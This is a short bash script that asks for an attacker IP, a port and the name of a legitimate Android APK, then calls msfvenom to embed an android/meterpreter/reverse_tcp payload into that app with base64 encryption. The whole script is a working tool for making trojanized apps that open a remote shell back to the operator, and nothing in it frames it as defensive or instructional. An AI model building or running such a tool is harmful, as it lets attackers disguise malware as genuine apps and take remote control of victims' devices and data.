#!/bin/bash
green='\033[0;32m'
yellow='\033[0;33m'
echo -e $yellow
echo -n "Enter PAYLOAD name: "
read PAYLOAD 
echo -n "Enter Your IP: "
read IP
echo -n "Enter PORT No: "
read PORT 
echo -n "Enter The Name Of Your Legit apk: "
read path 

xterm -e msfvenom -x $path -p android/meterpreter/reverse_tcp --platform=android --encrypt=base64 LHOST=$IP LPORT=$PORT -o $PAYLOAD.apk

